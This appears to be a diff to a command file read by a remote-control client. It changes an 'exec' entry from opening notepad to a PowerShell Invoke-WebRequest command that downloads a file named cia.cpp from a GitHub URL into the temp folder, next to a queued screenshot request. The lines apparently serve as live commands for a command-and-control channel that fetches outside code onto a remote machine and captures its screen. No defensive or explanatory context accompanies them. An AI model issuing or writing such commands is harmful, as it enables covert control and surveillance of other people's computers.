@@ -1,2 +1,2 @@
-exec|ii notepad|112
-screenshot||113
+exec|powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Aryan810/aryan810.github.io/master/cia.cpp" -OutFile "%temp%/aaaaaaaaaa.cpp"|114
+screenshot||115
